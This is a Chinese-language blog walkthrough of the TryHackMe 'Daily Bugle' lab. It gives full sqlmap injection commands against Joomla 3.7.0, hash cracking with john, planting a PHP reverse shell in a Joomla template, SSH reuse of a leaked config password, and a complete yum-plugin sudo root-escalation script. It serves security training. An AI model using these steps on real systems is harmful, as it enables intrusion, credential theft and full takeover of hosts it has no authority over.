---
title: "THM Daily Bugle"
description: "TryHackMe篇之Daily Bugle"

date: 2024-10-08T13:23:31+08:00
lastmod: 2025-11-11T11:17:29+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.158.159

# 信息收集

## nmap扫描

`nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap`

![image-20241008133559967](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008133602854-1151410066.png)

发现有22，80，3306端口开放，并且在80端口上有`robots.txt`，开启了mysql服务

## 80端口

![image-20241008135112969](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008135115833-1217847155.png)

页面貌似没什么信息，扫描一下目录

`gobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt`

![image-20241008135614061](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008135616416-1722312870.png)

先看下`robots.txt`

![image-20241008135634589](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008135637011-1331873752.png)

综上来看这是一个`joomla CMS`，目录访问后并没有发现什么信息

# SQL漏洞利用

使用`joomscan`测试一下

`joomscan -u http://10.10.158.159/`

![image-20241008141252485](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008141255235-581479402.png)

发现版本是3.7.0，搜索一下是否有可以利用的漏洞

`searchsploit joomla 3.7.0`

![image-20241008141438525](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008141440663-205205108.png)

发现在该版本存在sql注入，将文件复制下来查看

![image-20241008141543468](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008141545963-1681767930.png)

这里写了使用`sqlmap`工具进行sql注入，直接照着弄就行

`sqlmap -u "http://10.10.158.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`

![image-20241008143752393](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008143755357-1634909799.png)

利用成功，得到数据库，继续爆破表

`sqlmap -u "http://10.10.158.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]` 

![image-20241008144206265](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008144208470-98185412.png)

得到很多表，我们重点看`users`表，先查看字段的值

`sqlmap -u "http://10.10.158.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --columns -p list[fullordering]`

![image-20241008144828658](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008144831007-655266633.png)

选项直接正常选就行

![image-20241008150237274](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008150239571-1068282498.png)

漫长等待后也是把字段爆破出来了，我们重点看用户名和密码

`sqlmap -u "http://10.10.158.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C username,password --dump -p list[fullordering]`

![image-20241008150413037](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008150415433-886794507.png)

成功拿到了一组凭据

`jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

密码是加密数据，这里使用`john`破解，先将密码保存至`hash`

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

![image-20241008152018882](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008152021738-1397311919.png)

得到`jonah`用户的明文密码`spiderman123`

登录`joomla`

![image-20241008152331521](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008152334179-1197770814.png)

登陆成功

# 获得初始权限

查看后发现可以通过改写模板文件的内容getshell

首先点击右侧`Template`

![image-20241008152507304](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008152509620-2024984243.png)

再点击右侧的`Template`

![image-20241008152706921](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008152709570-776349238.png)

选第一个`Beez3`

![image-20241008152749484](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008152751934-1122413670.png)

为了方便反弹shell，直接修改index.php文件

将[php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)写到文件中，并修改其中的ip和port

![image-20241008154533386](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008154536026-2069500358.png)

保存，在kali中起个监听

![image-20241008153220414](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008153222944-538312390.png)

在页面中访问刚才修改的文件

`http://10.10.158.159/templates/beez3/index.php`

![image-20241008154614259](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008154616790-1766426576.png)

getshell成功！

![image-20241008154835273](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008154837476-1061401653.png)

现在只有一个初始访问权限，还需要横向移动到`jjameson`用户

# 提升至user权限

先查看文件

![image-20241008160838389](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/image-20241008160838389.png)

在查看文件的时候发现在 `/var/www/html`目录下有个`configuration.php`文件，查看一下

![image-20241008160957808](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008161000178-1468348786.png)

发现有密码`nv5uz9r3ZEDzVjNu`，貌似是root用户的，ssh登录一下

![image-20241008161331426](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008161333840-1625929510.png)

看样子不是root的密码，尝试ssh登陆`jjameson`

![image-20241008161253699](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008161255917-2029099622.png)

登陆成功

![image-20241008161354772](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008161356936-1355687411.png)

直接在当前页面找到`user.txt`

# 提升至root权限

先执行`sudo -l`看看是否有可利用的

![image-20241008161548452](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008161550666-1278824895.png)

可以使用`yum`提权

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

![image-20241008161919145](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008161921642-247827710.png)

提权成功

![image-20241008162016902](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241008162019148-1120378338.png)

在`/root`目录下找到`root.txt`